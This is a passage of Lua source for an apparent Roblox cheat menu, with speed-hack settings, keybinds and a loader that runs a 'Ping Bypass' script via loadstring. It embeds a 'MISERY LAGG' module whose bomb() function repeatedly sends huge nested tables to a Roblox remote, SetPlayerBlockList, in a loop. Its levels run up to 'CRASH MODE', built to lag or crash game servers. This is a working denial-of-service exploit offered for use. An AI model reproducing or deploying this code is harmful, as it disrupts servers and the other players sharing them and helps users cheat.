        mkStroke(btn, C.border, 1.1, 0.28)
        keybindBtnRefs[keyRef] = btn

        btn.MouseButton1Click:Connect(function()
            if activeKeybindKeyRef == keyRef then cancelActiveKeybind(); return end
            cancelActiveKeybind()
            activeKeybindBtn = btn
            activeKeybindKeyRef = keyRef
            btn.Text = "..."
            _G.EmbeerKeybinds.capture(btn, keyRef)
        end)
    end

    local function trigger()
        TweenService:Create(switchDot,TweenInfo.new(0.10),{Position=UDim2.new(1,-16,0.5,-6)}):Play()
        TweenService:Create(switchBg,TweenInfo.new(0.10),{BackgroundColor3=C.pillOn,BackgroundTransparency=0.03}):Play()
        TweenService:Create(switchStroke,TweenInfo.new(0.10),{Color=C.text,Transparency=0.05,Thickness=1.25}):Play()
        TweenService:Create(rowStroke,TweenInfo.new(0.10),{Color=C.text,Transparency=0.12,Thickness=1.25}):Play()
        onTrigger()
        task.delay(0.16,function()
            TweenService:Create(switchDot,TweenInfo.new(0.10),{Position=UDim2.new(0,3,0.5,-6)}):Play()
            TweenService:Create(switchBg,TweenInfo.new(0.10),{BackgroundColor3=C.pillOff,BackgroundTransparency=0.2}):Play()
            TweenService:Create(switchStroke,TweenInfo.new(0.10),{Color=C.border,Transparency=0.45,Thickness=1}):Play()
            TweenService:Create(rowStroke,TweenInfo.new(0.10),{Color=C.border,Transparency=0.38,Thickness=1.15}):Play()
        end)
    end
    row.MouseButton1Click:Connect(trigger)
    return trigger
end
local function makeInputRow(label, defaultVal, onEnter, parent)
    local row = Instance.new("Frame", parent)
    row.Size = UDim2.new(1, 0, 0, 34)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.6
    row.BorderSizePixel = 0
    row.LayoutOrder = LO()
    row.ZIndex = 7
    styleXzzRow(row)

    local title = Instance.new("TextLabel", row)
    title.Size = UDim2.new(0.6, 0, 1, 0)
    title.Position = UDim2.new(0, 14, 0, 0)
    title.BackgroundTransparency = 1
    title.Text = label
    title.TextColor3 = Color3.fromRGB(255, 255, 255)
    title.TextTransparency = 0
    title.Font = Enum.Font.GothamBlack
    title.TextSize = 13
    title.TextXAlignment = Enum.TextXAlignment.Left
    title.TextStrokeTransparency = 1
    title.TextStrokeColor3 = Color3.new(0,0,0)
    title.ZIndex = 8

    local valWrap = Instance.new("Frame", row)
    valWrap.Size = UDim2.new(0, 58, 0, 24)
    valWrap.Position = UDim2.new(1, -68, 0.5, -12)
    valWrap.BackgroundColor3 = C.panel
    valWrap.BackgroundTransparency = 0.18
    valWrap.BorderSizePixel = 0
    valWrap.ZIndex = 12
    mkCorner(valWrap, 7)
    mkStroke(valWrap, C.border, 1, 0.45)

    local valBox = Instance.new("TextBox", valWrap)
    valBox.Size = UDim2.new(1, 0, 1, 0)
    valBox.BackgroundTransparency = 1
    valBox.Text = tostring(defaultVal)
    valBox.TextColor3 = Color3.fromRGB(255, 255, 255)
    valBox.PlaceholderColor3 = Color3.fromRGB(255, 255, 255)
    valBox.TextTransparency = 1
    valBox.Font = Enum.Font.GothamBlack
    valBox.TextSize = 13
    valBox.TextStrokeTransparency = 1
    valBox.TextStrokeColor3 = Color3.new(0,0,0)
    valBox.ClearTextOnFocus = false
    styleWhiteValueBox(valBox, valWrap)
    valBox.ZIndex = 6
    valBox.FocusLost:Connect(function()
        local n = tonumber(valBox.Text)
        if n then onEnter(n) end
    end)
    return valBox
end

-- ============================================================
-- POPULATE TABS
-- ============================================================

-- ============================================================
-- POPULATE CONTENT
-- ============================================================

local function makeLine(parent)
    local line = Instance.new("Frame", parent)
    line.Size = UDim2.new(1, 0, 0, 1)
    line.BackgroundColor3 = C.border
    line.BackgroundTransparency = 0.5
    line.BorderSizePixel = 0
    line.LayoutOrder = LO()
    line.ZIndex = 7
end

-- SPEED tab (Smoke Hub speed system)
loCount = 0
makeSectionHeader("SPEED", tabSpeed)
makeSpeedRow("Normal Speed (NS)", function() return SPD.NS end, function(v) SPD.NS = v end, tabSpeed)
makeSpeedRow("Carry Speed (CS)", function() return SPD.CS end, function(v) SPD.CS = v end, tabSpeed)
makeSpeedRow("Lagger Speed", function() return SPD.LAGGER_SPEED end, function(v) SPD.LAGGER_SPEED = v end, tabSpeed)
makeSpeedRow("Lagger Carry Speed", function() return SPD.LAGGER_CARRY_SPEED end, function(v) SPD.LAGGER_CARRY_SPEED = v end, tabSpeed)
makeSectionHeader("ANTI DROP", tabSpeed)
toggleRefs.antiDrop = makeToggleRow("Anti Drop (Void)", SPD.antiDropEnabled == true, function(on, isSync)
    SPD.antiDropEnabled = on == true
    if SPD.setAntiDrop then
        SPD.setAntiDrop(on == true)
    end
    if not isSync then task.spawn(saveConfig) end
end, nil, tabSpeed)

-- ============================================================
-- PING BYPASS — Open / Close (BLAST Ping Bypass)
-- ============================================================
makeSectionHeader("BLAST PING", tabSpeed)
do
    local row = Instance.new("Frame", tabSpeed)
    row.Size = UDim2.new(1, 0, 0, 34)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.05
    row.BorderSizePixel = 0
    row.LayoutOrder = LO()
    row.ZIndex = 7
    mkCorner(row, 9)
    mkStroke(row, C.border, 1.15, 0.38)

    local openBtn = Instance.new("TextButton", row)
    openBtn.Size = UDim2.new(0.46, -6, 0, 24)
    openBtn.Position = UDim2.new(0, 8, 0.5, -12)
    openBtn.BackgroundColor3 = C.accent
    openBtn.BackgroundTransparency = 0.1
    openBtn.BorderSizePixel = 0
    openBtn.Text = "OPEN"
    openBtn.TextColor3 = Color3.fromRGB(255, 255, 255)
    openBtn.Font = Enum.Font.GothamBlack
    openBtn.TextSize = 12
    openBtn.ZIndex = 8
    openBtn.AutoButtonColor = false
    mkCorner(openBtn, 8)

    local closeBtn = Instance.new("TextButton", row)
    closeBtn.Size = UDim2.new(0.46, -6, 0, 24)
    closeBtn.Position = UDim2.new(0.54, 0, 0.5, -12)
    closeBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 22)
    closeBtn.BackgroundTransparency = 0.1
    closeBtn.BorderSizePixel = 0
    closeBtn.Text = "CLOSE"
    closeBtn.TextColor3 = Color3.fromRGB(255, 230, 245)
    closeBtn.Font = Enum.Font.GothamBlack
    closeBtn.TextSize = 12
    closeBtn.ZIndex = 8
    closeBtn.AutoButtonColor = false
    mkCorner(closeBtn, 8)

    local function pingExists()
        local found = false
        local function scan(parent)
            if parent and parent:FindFirstChild("BlastPingBypass") then found = true end
        end
        pcall(function() if gethui then scan(gethui()) end end)
        pcall(function() scan(game:GetService("CoreGui")) end)
        pcall(function()
            local lp = game:GetService("Players").LocalPlayer
            if lp then scan(lp:FindFirstChild("PlayerGui")) end
        end)
        if type(_G.BlastPingIsOpen) == "function" then
            local ok, v = pcall(_G.BlastPingIsOpen)
            if ok and v then found = true end
        end
        return found
    end

    local function paintPingBtns()
        local on = pingExists()
        if on then
            openBtn.BackgroundColor3 = Color3.fromRGB(80, 200, 120)
            openBtn.Text = "OPEN · ON"
            closeBtn.BackgroundColor3 = Color3.fromRGB(200, 40, 90)
            closeBtn.Text = "CLOSE"
        else
            openBtn.BackgroundColor3 = C.accent
            openBtn.Text = "OPEN"
            closeBtn.BackgroundColor3 = Color3.fromRGB(50, 30, 22)
            closeBtn.Text = "CLOSE"
        end
    end

    openBtn.MouseButton1Click:Connect(function()
        pcall(function()
            if pingExists() then
                -- already open: just ensure panel visible if floating OPEN exists
                paintPingBtns()
                print("[BLAST] Ping Bypass already open")
                return
            end
            if type(_G._BlastPingSource) == "string" and #_G._BlastPingSource > 100 then
                local fn, err = loadstring(_G._BlastPingSource)
                if not fn then
                    warn("[BLAST] Ping Bypass load error: " .. tostring(err))
                    return
                end
                local ok, runErr = pcall(fn)
                if not ok then
                    warn("[BLAST] Ping Bypass run error: " .. tostring(runErr))
                else
                    print("[BLAST] Ping Bypass OPEN")
                end
            else
                warn("[BLAST] Ping Bypass source missing")
            end
            paintPingBtns()
        end)
    end)

    closeBtn.MouseButton1Click:Connect(function()
        pcall(function()
            if type(_G.BlastPingClose) == "function" then
                _G.BlastPingClose()
            else
                local function kill(parent)
                    if not parent then return end
                    local g = parent:FindFirstChild("BlastPingBypass")
                    if g then g:Destroy() end
                end
                pcall(function() if gethui then kill(gethui()) end end)
                pcall(function() kill(game:GetService("CoreGui")) end)
                pcall(function()
                    local lp = game:GetService("Players").LocalPlayer
                    if lp then kill(lp:FindFirstChild("PlayerGui")) end
                end)
            end
            _G.BlastPingClose = nil
            _G.BlastPingIsOpen = nil
            print("[BLAST] Ping Bypass CLOSED (fully removed)")
            paintPingBtns()
        end)
    end)

    -- live paint so OPEN/CLOSE animation always reflects state
    task.spawn(function()
        while row and row.Parent do
            paintPingBtns()
            task.wait(0.4)
        end
    end)
    paintPingBtns()
end
-- Lagger UI removed

-- Current mode row (click = toggle carry)
do
    local row = Instance.new("Frame", tabSpeed)
    row.Size = UDim2.new(1, 0, 0, 34)
    row.BackgroundColor3 = C.card
    row.BackgroundTransparency = 0.05
    row.BorderSizePixel = 0
    row.LayoutOrder = LO()
    row.ZIndex = 7
    mkCorner(row, 9)
    mkStroke(row, C.border, 1.15, 0.38)

    local lbl = Instance.new("TextLabel", row)
    lbl.Size = UDim2.new(0.6, 0, 1, 0)
    lbl.Position = UDim2.new(0, 12, 0, 0)
    lbl.BackgroundTransparency = 1
    lbl.Text = "Mode (click = Carry)"
    lbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    lbl.TextTransparency = 0
    lbl.Font = Enum.Font.GothamBlack
    lbl.TextSize = 13
    lbl.TextXAlignment = Enum.TextXAlignment.Left
    lbl.TextStrokeTransparency = 1
    lbl.TextStrokeColor3 = Color3.new(0,0,0)
    lbl.ZIndex = 8

    SPD.modeValLbl = Instance.new("TextLabel", row)
    SPD.modeValLbl.Size = UDim2.new(0, 130, 1, 0)
    SPD.modeValLbl.Position = UDim2.new(1, -140, 0, 0)
    SPD.modeValLbl.BackgroundTransparency = 1
    SPD.modeValLbl.Text = "Normal"
    SPD.modeValLbl.TextColor3 = Color3.fromRGB(255, 255, 255)
    SPD.modeValLbl.TextTransparency = 0
    SPD.modeValLbl.Font = Enum.Font.GothamBlack
    SPD.modeValLbl.TextSize = 13
    SPD.modeValLbl.TextXAlignment = Enum.TextXAlignment.Right
    SPD.modeValLbl.TextStrokeTransparency = 1
    SPD.modeValLbl.TextStrokeColor3 = Color3.new(0,0,0)
    SPD.modeValLbl.ZIndex = 12

    local clk = Instance.new("TextButton", row)
    clk.Size = UDim2.new(1, 0, 1, 0)
    clk.BackgroundTransparency = 1
    clk.Text = ""
    clk.AutoButtonColor = false
    clk.ZIndex = 6
    clk.MouseButton1Click:Connect(function()
        SPD.toggleCarryMode()
        task.spawn(saveConfig)
    end)
end

SPD.refreshSpeedModeLabel()
makeLine(tabSpeed)
makeSectionHeader("KEYBINDS", tabSpeed)
makeKeybindRow("Carry Key", "carry", tabSpeed)
makeKeybindRow("Lagger Toggle", "lagger", tabSpeed)
makeLine(tabSpeed)


-- ============================================================
-- MISERY LAGG (chunk separado via loadstring — nao estoura o limite de 200 locals)
-- ============================================================
_G.BlastOpenLagger = function(forceOpen)
    local cg = game:GetService("CoreGui")
    local existing = cg:FindFirstChild("BlastLagg_UI")
    if not existing then
        local pg = LP:FindFirstChild("PlayerGui")
        existing = pg and pg:FindFirstChild("BlastLagg_UI")
    end
    if existing then
        if forceOpen == true then
            existing.Enabled = true
        elseif forceOpen == false then
            existing.Enabled = false
        else
            existing.Enabled = not existing.Enabled
        end
        State.laggerOpen = existing.Enabled == true
        if _G.BlastApplyLaggerScale then _G.BlastApplyLaggerScale() end
        task.spawn(saveConfig)
        return
    end
    if forceOpen == false then
        State.laggerOpen = false
        task.spawn(saveConfig)
        return
    end
    local src = [=====[
local Players = game:GetService("Players") local UserInputService = game:GetService("UserInputService") local TweenService = game:GetService("TweenService") local CoreGui = game:GetService("CoreGui") local HttpService = game:GetService("HttpService") local RunService = game:GetService("RunService") local player = Players.LocalPlayer local ConfigFile = "CleanDuelsConfig.json" local savedPosition = nil local NIVELES = { V1 = { poder = 20, texto = "MODE SPEED 50-25", color = Color3.fromRGB(76, 175, 80) }, V2 = { poder = 25, texto = "MODE SPEED 45-23", color = Color3.fromRGB(255, 193, 7) }, V3 = { poder = 32, texto = "MODE SPEED 40-17", color = Color3.fromRGB(244, 67, 54) }, V4 = { poder = 70, texto = "CRASH MODE", color = Color3.fromRGB(156, 39, 176) } } local keybind = Enum.KeyCode.M local listeningForInput = false local laggerActive = false local lagThread = nil local nivelActual = "V1" local ventanaBloqueada = false local UI_CONFIG = { MainBg = Color3.fromRGB(8, 10, 18), TitleColor = Color3.fromRGB(255, 255, 255), TextColor = Color3.fromRGB(235, 235, 245), ButtonInact = Color3.fromRGB(9, 11, 18), ButtonV1 = Color3.fromRGB(76, 175, 80), ButtonV2 = Color3.fromRGB(255, 193, 7), ButtonV3 = Color3.fromRGB(244, 67, 54), ButtonV4 = Color3.fromRGB(156, 39, 176), ToggleOff = Color3.fromRGB(211, 47, 47), ToggleOn = Color3.fromRGB(46, 160, 67), LockColor = Color3.fromRGB(255, 64, 76), UnlockColor = Color3.fromRGB(170, 170, 185), Font = Enum.Font.GothamBlack, BorderColor = Color3.fromRGB(45, 47, 65), GlowColor = Color3.fromRGB(160, 80, 220), SelectorBg = Color3.fromRGB(18, 19, 30), SelectorAct = Color3.fromRGB(170, 55, 235), OrangeBorder = Color3.fromRGB(35, 38, 55), CornerRadius = 10, PanelWidth = 260, PanelHeight = 130, BarHeight = 32, } local function SaveConfig() local data = { Keybind = keybind.Name, Nivel = nivelActual, Bloqueado = ventanaBloqueada, Position = savedPosition } pcall(function() writefile(ConfigFile, HttpService:JSONEncode(data)) end) end local function LoadConfig() if pcall(isfile, ConfigFile) and isfile(ConfigFile) then pcall(function() local data = HttpService:JSONDecode(readfile(ConfigFile)) keybind = Enum.KeyCode[data.Keybind] or Enum.KeyCode.M nivelActual = data.Nivel or "V1" ventanaBloqueada = data.Bloqueado or false local position = data.Position if type(position) == "table" then savedPosition = { XScale = tonumber(position.XScale) or 0.5, XOffset = tonumber(position.XOffset) or 0, YScale = tonumber(position.YScale) or 0.5, YOffset = tonumber(position.YOffset) or 0 } end end) end end LoadConfig() local function bomb(poder) local main, spam = {}, {{}} local z = spam[1] for i = 1, 25 do local t = {} table.insert(z, t) z = t end local max = math.min(12000, poder * 50) for i = 1, max do table.insert(main, spam) end pcall(function() game:GetService("RobloxReplicatedStorage").SetPlayerBlockList:FireServer(main) end) end local toggleBall, toggleContainer, btnV1, btnV2, btnV3, btnV4, lockButton local titleLabel, textLagger, keybindButton, toggleClick, shadowLabel, shadowGradient local mainFrame, screenGui, centralContainer, headerFrame local minimizeButton, expandButton local expanded = true local modeTextLabel local warningFrame = nil local warningActive = false local function actualizarBotonesNivel()
    local botones = {
        { boton = btnV1, nivel = "V1", color = UI_CONFIG.ButtonV1 },
        { boton = btnV2, nivel = "V2", color = UI_CONFIG.ButtonV2 },
        { boton = btnV3, nivel = "V3", color = UI_CONFIG.ButtonV3 },
        { boton = btnV4, nivel = "V4", color = UI_CONFIG.ButtonV4 },
    }
    for _, item in ipairs(botones) do
        local activo = nivelActual == item.nivel
        item.boton.TextColor3 = activo and Color3.fromRGB(255, 255, 255) or Color3.fromRGB(170, 170, 170)
        item.boton.BackgroundColor3 = activo and item.color or UI_CONFIG.ButtonInact
        item.boton.BorderSizePixel = 1
        item.boton.BorderColor3 = activo and item.color or UI_CONFIG.BorderColor
    end
    if modeTextLabel then
        local info = NIVELES[nivelActual]
        modeTextLabel.Text = info.texto
        modeTextLabel.TextColor3 = info.color
    end
end
local function actualizarSwitch() local toggleColor = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff if toggleContainer then toggleContainer.BackgroundColor3 = toggleColor end if toggleBall then toggleBall.BackgroundColor3 = toggleColor if laggerActive then toggleBall.Position = UDim2.new(1, -18, 0.5, -9) else toggleBall.Position = UDim2.new(0, 3, 0.5, -9) end end if toggleClick then toggleClick.BackgroundColor3 = toggleColor toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE" toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255) end end local function actualizarCandado() lockButton.Text = ventanaBloqueada and "LOCK" or "UNLOCK" lockButton.TextColor3 = ventanaBloqueada and UI_CONFIG.LockColor or UI_CONFIG.UnlockColor end local function actualizarKeybindButton() if keybindButton then local display = keybind.Name if display == "CapsLock" then display = "Ca" elseif display:match("Button") then display = display:gsub("Button", "") end keybindButton.Text = "KEY: " .. display end end local function toggleLagger() laggerActive = not laggerActive local targetPos = laggerActive and UDim2.new(1, -18, 0.5, -9) or UDim2.new(0, 3, 0.5, -9) TweenService:Create(toggleBall, TweenInfo.new(0.2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out), { Position = targetPos }):Play() toggleClick.BackgroundColor3 = laggerActive and UI_CONFIG.ToggleOn or UI_CONFIG.ToggleOff toggleClick.Text = laggerActive and "ACTIVE" or "INACTIVE" toggleClick.TextColor3 = Color3.fromRGB(255, 255, 255) if laggerActive then if lagThread then task.cancel(lagThread) end lagThread = task.spawn(function() while laggerActive do pcall(function() game:GetService("NetworkClient"):SetOutgoingKBPSLimit(80000) end) bomb(NIVELES[nivelActual].poder) task.wait(0.18) end end) else if lagThread then task.cancel(lagThread); lagThread = nil end end end local function showWarning(callback) if warningActive then return end warningActive = true local popup = Instance.new("Frame", screenGui) popup.Name = "WarningPopup" popup.BackgroundColor3 = Color3.fromRGB(48, 48, 48) popup.BorderSizePixel = 2 popup.BorderColor3 = Color3.fromRGB(140, 140, 140) popup.Size = UDim2.new(0, 280, 0, 170) popup.Position = UDim2.new(0.5, -140, 0.5, -110) popup.ZIndex = 100 local popupCorner = Instance.new("UICorner", popup) popupCorner.CornerRadius = UDim.new(0, 12) local gradient = Instance.new("UIGradient", popup) gradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(48, 48, 48)), ColorSequenceKeypoint.new(1, Color3.fromRGB(35, 35, 35)) }) gradient.Rotation = 45 local stroke = Instance.new("UIStroke", popup) stroke.Color = Color3.fromRGB(210, 210, 210) stroke.Thickness = 1 stroke.Transparency = 0.7 local warnText = Instance.new("TextLabel", popup) warnText.Name = "WarnText" warnText.BackgroundTransparency = 1 warnText.Size = UDim2.new(1, -20, 0.6, -10) warnText.Position = UDim2.new(0, 10, 0, 10) warnText.Font = Enum.Font.GothamMedium warnText.Text = [[⚠️ This mode may overheat your device.
Use it only on mid-range or high-end devices.
Lower-end devices may experience ping or lag.]] warnText.TextColor3 = Color3.fromRGB(255, 255, 255) warnText.TextSize = 14 warnText.TextWrapped = true warnText.TextXAlignment = Enum.TextXAlignment.Center warnText.TextYAlignment = Enum.TextYAlignment.Center warnText.ZIndex = 101 local textStroke = Instance.new("UIStroke", warnText) textStroke.Color = Color3.fromRGB(35, 35, 35) textStroke.Thickness = 1 textStroke.Transparency = 0.5 local yesBtn = Instance.new("TextButton", popup) yesBtn.Name = "YesBtn" yesBtn.BackgroundColor3 = Color3.fromRGB(46, 160, 67) yesBtn.BorderSizePixel = 0 yesBtn.Size = UDim2.new(0, 70, 0, 26) yesBtn.Position = UDim2.new(0.5, -80, 1, -34) yesBtn.Font = Enum.Font.GothamBlack yesBtn.Text = "YES" yesBtn.TextColor3 = Color3.fromRGB(255, 255, 255) yesBtn.TextSize = 14 yesBtn.ZIndex = 101 local yesCorner = Instance.new("UICorner", yesBtn) yesCorner.CornerRadius = UDim.new(0, 8) yesBtn.MouseButton1Click:Connect(function() warningActive = false popup:Destroy() callback(true) end) yesBtn.MouseEnter:Connect(function() yesBtn.BackgroundColor3 = Color3.fromRGB(76, 190, 92) end) yesBtn.MouseLeave:Connect(function() yesBtn.BackgroundColor3 = Color3.fromRGB(46, 160, 67) end) local noBtn = Instance.new("TextButton", popup) noBtn.Name = "NoBtn" noBtn.BackgroundColor3 = Color3.fromRGB(211, 47, 47) noBtn.BorderSizePixel = 0 noBtn.Size = UDim2.new(0, 70, 0, 26) noBtn.Position = UDim2.new(0.5, 10, 1, -34) noBtn.Font = Enum.Font.GothamBlack noBtn.Text = "NO" noBtn.TextColor3 = Color3.fromRGB(255, 255, 255) noBtn.TextSize = 14 noBtn.ZIndex = 101 local noCorner = Instance.new("UICorner", noBtn) noCorner.CornerRadius = UDim.new(0, 8) noBtn.MouseButton1Click:Connect(function() warningActive = false popup:Destroy() callback(false) end) noBtn.MouseEnter:Connect(function() noBtn.BackgroundColor3 = Color3.fromRGB(235, 80, 80) end) noBtn.MouseLeave:Connect(function() noBtn.BackgroundColor3 = Color3.fromRGB(211, 47, 47) end) warningFrame = popup end local function collapseWindow() if not expanded then return end expanded = false centralContainer.Visible = false local tweenInfo = TweenInfo.new(0.3, Enum.EasingStyle.Quad, Enum.EasingDirection.Out) TweenService:Create(mainFrame, tweenInfo, { Size = UDim2.new(0, UI_CONFIG.PanelWidth, 0, UI_CONFIG.BarHeight) }):Play() end local function expandWindow() if expanded then return end expanded = true centralContainer.Visible = true centralContainer.Size = UDim2.new(1, -10, 0, 0) local tweenInfo = TweenInfo.new(0.4, Enum.EasingStyle.Quad, Enum.EasingDirection.Out) TweenService:Create(mainFrame, tweenInfo, { Size = UDim2.new(0, UI_CONFIG.PanelWidth, 0, UI_CONFIG.PanelHeight) }):Play() TweenService:Create(centralContainer, tweenInfo, { Size = UDim2.new(1, -10, 1, -(UI_CONFIG.BarHeight + 6)) }):Play() end if CoreGui:FindFirstChild("BlastLagg_UI") then CoreGui.BlastLagg_UI:Destroy() end screenGui = Instance.new("ScreenGui")
screenGui.Name = "BlastLagg_UI"
screenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
screenGui.ResetOnSpawn = false
screenGui.IgnoreGuiInset = true
screenGui.DisplayOrder = 12000
screenGui.Enabled = true
pcall(function() screenGui.Parent = (gethui and gethui()) or CoreGui end)
if not screenGui.Parent then
    pcall(function() screenGui.Parent = player:FindFirstChild("PlayerGui") or player:WaitForChild("PlayerGui", 5) end)
end mainFrame = Instance.new("Frame") mainFrame.Name = "MainFrame" mainFrame.BackgroundColor3 = UI_CONFIG.MainBg mainFrame.BackgroundTransparency = 0.12 mainFrame.BorderSizePixel = 1 mainFrame.BorderColor3 = Color3.fromRGB(35, 38, 55) mainFrame.Size = UDim2.new(0, UI_CONFIG.PanelWidth, 0, UI_CONFIG.PanelHeight) mainFrame.Position = UDim2.new(0.5, -UI_CONFIG.PanelWidth/2, 0.5, -UI_CONFIG.PanelHeight/2) if savedPosition then mainFrame.Position = UDim2.new(savedPosition.XScale or 0.5, savedPosition.XOffset or -UI_CONFIG.PanelWidth/2, savedPosition.YScale or 0.5, savedPosition.YOffset or -UI_CONFIG.PanelHeight/2) end mainFrame.Parent = screenGui mainFrame.ClipsDescendants = true local mainCorner = Instance.new("UICorner", mainFrame) mainCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) local backgroundImage = Instance.new("ImageLabel", mainFrame) backgroundImage.Name = "BackgroundImage" backgroundImage.Size = UDim2.new(1, 0, 1, 0) backgroundImage.Position = UDim2.new(0, 0, 0, 0) backgroundImage.Image = "rbxassetid://83597321089055" backgroundImage.ImageColor3 = Color3.fromRGB(255, 255, 255) backgroundImage.ImageTransparency = 0.02 backgroundImage.BackgroundTransparency = 1 backgroundImage.ZIndex = 0 backgroundImage.ScaleType = Enum.ScaleType.Stretch backgroundImage.ClipsDescendants = true local imgCorner = Instance.new("UICorner", backgroundImage) imgCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) local grayImageTint = Instance.new("Frame", mainFrame) grayImageTint.Name = "GrayImageTint" grayImageTint.Size = UDim2.new(1, 0, 1, 0) grayImageTint.Position = UDim2.new(0, 0, 0, 0) grayImageTint.BackgroundColor3 = Color3.fromRGB(0, 0, 0) grayImageTint.BackgroundTransparency = 0.65 grayImageTint.BorderSizePixel = 0 grayImageTint.ZIndex = 0 local grayTintCorner = Instance.new("UICorner", grayImageTint) grayTintCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) headerFrame = Instance.new("Frame", mainFrame) headerFrame.Name = "HeaderFrame" headerFrame.BackgroundColor3 = Color3.fromRGB(5, 7, 14) headerFrame.BackgroundTransparency = 0.38 headerFrame.BorderSizePixel = 0 headerFrame.Size = UDim2.new(1, 0, 0, UI_CONFIG.BarHeight) headerFrame.Position = UDim2.new(0, 0, 0, 0) headerFrame.ZIndex = 2 local headerCorner = Instance.new("UICorner", headerFrame) headerCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) titleLabel = Instance.new("TextLabel", headerFrame) titleLabel.BackgroundTransparency = 1 titleLabel.Position = UDim2.new(0, 5, 0, 0) titleLabel.Size = UDim2.new(0, 160, 0, UI_CONFIG.BarHeight) titleLabel.Font = Enum.Font.GothamBlack titleLabel.Text = "MISERY LAGG" titleLabel.TextColor3 = Color3.fromRGB(235, 235, 235) titleLabel.TextSize = 16 titleLabel.TextXAlignment = Enum.TextXAlignment.Left titleLabel.TextYAlignment = Enum.TextYAlignment.Center titleLabel.ZIndex = 3 titleLabel.ClipsDescendants = false shadowLabel = Instance.new("TextLabel", headerFrame) shadowLabel.BackgroundTransparency = 1 shadowLabel.Position = UDim2.new(0, 5, 0, 0) shadowLabel.Size = UDim2.new(0, 160, 0, UI_CONFIG.BarHeight) shadowLabel.Font = Enum.Font.GothamBlack shadowLabel.Text = "MISERY LAGG" shadowLabel.TextSize = 16 shadowLabel.TextXAlignment = Enum.TextXAlignment.Left shadowLabel.TextYAlignment = Enum.TextYAlignment.Center shadowLabel.ZIndex = 4 shadowLabel.ClipsDescendants = true shadowLabel.TextTransparency = 0 shadowLabel.TextColor3 = Color3.fromRGB(235, 235, 235) shadowGradient = Instance.new("UIGradient", shadowLabel) shadowGradient.Color = ColorSequence.new({ ColorSequenceKeypoint.new(0, Color3.fromRGB(195, 195, 195)), ColorSequenceKeypoint.new(0.2, Color3.fromRGB(220, 220, 220)), ColorSequenceKeypoint.new(0.4, Color3.fromRGB(245, 245, 245)), ColorSequenceKeypoint.new(0.6, Color3.fromRGB(220, 220, 220)), ColorSequenceKeypoint.new(0.8, Color3.fromRGB(195, 195, 195)), ColorSequenceKeypoint.new(1, Color3.fromRGB(180, 180, 180)) }) shadowGradient.Rotation = 0 task.spawn(function() while true do for i = 0, 1, 0.006 do shadowGradient.Offset = Vector2.new(i, 0) task.wait(0.025) end end end) keybindButton = Instance.new("TextButton", headerFrame) keybindButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45) keybindButton.BackgroundTransparency = 0.3 keybindButton.Position = UDim2.new(1, -140, 0.5, -8) keybindButton.Size = UDim2.new(0, 42, 0, 16) keybindButton.Font = Enum.Font.GothamBlack keybindButton.Text = "KEY: M" keybindButton.TextColor3 = Color3.fromRGB(220, 220, 220) keybindButton.TextSize = 8 keybindButton.AutoButtonColor = false keybindButton.ZIndex = 5 local keyCorner = Instance.new("UICorner", keybindButton) keyCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) actualizarKeybindButton() lockButton = Instance.new("TextButton", headerFrame) lockButton.BackgroundTransparency = 0.3 lockButton.BackgroundColor3 = Color3.fromRGB(45, 45, 45) lockButton.Position = UDim2.new(1, -92, 0.5, -8) lockButton.Size = UDim2.new(0, 34, 0, 16) lockButton.Font = Enum.Font.GothamBlack lockButton.TextSize = 8 lockButton.TextColor3 = Color3.fromRGB(220, 220, 220) lockButton.AutoButtonColor = false lockButton.ZIndex = 5 local lockCorner = Instance.new("UICorner", lockButton) lockCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) lockButton.MouseButton1Click:Connect(function() ventanaBloqueada = not ventanaBloqueada actualizarCandado() SaveConfig() end) actualizarCandado() minimizeButton = Instance.new("TextButton", headerFrame) minimizeButton.BackgroundColor3 = Color3.fromRGB(56, 56, 56) minimizeButton.BackgroundTransparency = 0.5 minimizeButton.Position = UDim2.new(1, -52, 0.5, -9) minimizeButton.Size = UDim2.new(0, 18, 0, 18) minimizeButton.Font = Enum.Font.GothamBlack minimizeButton.Text = "-" minimizeButton.TextColor3 = Color3.fromRGB(220, 220, 220) minimizeButton.TextSize = 14 minimizeButton.AutoButtonColor = false minimizeButton.ZIndex = 5 local minCorner = Instance.new("UICorner", minimizeButton) minCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) minimizeButton.MouseButton1Click:Connect(collapseWindow) expandButton = Instance.new("TextButton", headerFrame) expandButton.BackgroundColor3 = Color3.fromRGB(56, 56, 56) expandButton.BackgroundTransparency = 0.5 expandButton.Position = UDim2.new(1, -28, 0.5, -9) expandButton.Size = UDim2.new(0, 18, 0, 18) expandButton.Font = Enum.Font.GothamBlack expandButton.Text = "+" expandButton.TextColor3 = Color3.fromRGB(240, 240, 240) expandButton.TextSize = 14 expandButton.AutoButtonColor = false expandButton.ZIndex = 5 local expCorner = Instance.new("UICorner", expandButton) expCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) expandButton.MouseButton1Click:Connect(expandWindow) centralContainer = Instance.new("Frame", mainFrame) centralContainer.Name = "CentralContainer" centralContainer.BackgroundColor3 = Color3.fromRGB(5, 7, 14) centralContainer.BackgroundTransparency = 0.55 centralContainer.BorderSizePixel = 0 centralContainer.BorderColor3 = UI_CONFIG.BorderColor centralContainer.Size = UDim2.new(1, -10, 1, -(UI_CONFIG.BarHeight + 6)) centralContainer.Position = UDim2.new(0, 5, 0, UI_CONFIG.BarHeight + 2) centralContainer.ZIndex = 1 local containerCorner = Instance.new("UICorner", centralContainer) containerCorner.CornerRadius = UDim.new(0, UI_CONFIG.CornerRadius) local padding = Instance.new("UIPadding", centralContainer) 